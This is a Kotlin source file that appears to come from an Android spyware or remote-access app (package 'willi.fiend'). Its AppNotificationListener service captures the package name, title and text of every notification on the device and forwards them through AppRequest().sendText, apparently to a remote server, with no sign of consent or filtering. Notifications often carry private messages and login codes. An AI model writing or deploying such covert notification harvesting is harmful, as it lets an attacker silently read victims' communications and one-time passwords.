package willi.fiend.Utils

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class AppNotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val title = sbn?.notification?.extras?.getString("android.title")
        val text = sbn?.notification?.extras?.getString("android.text")
        val packageName = sbn?.packageName

        var message = ""
        message += "App : $packageName\n"
        message += "Title : $title\n"
        message += "Text : $text"

        AppRequest().sendText(AppRequest.Text(message))
    }
}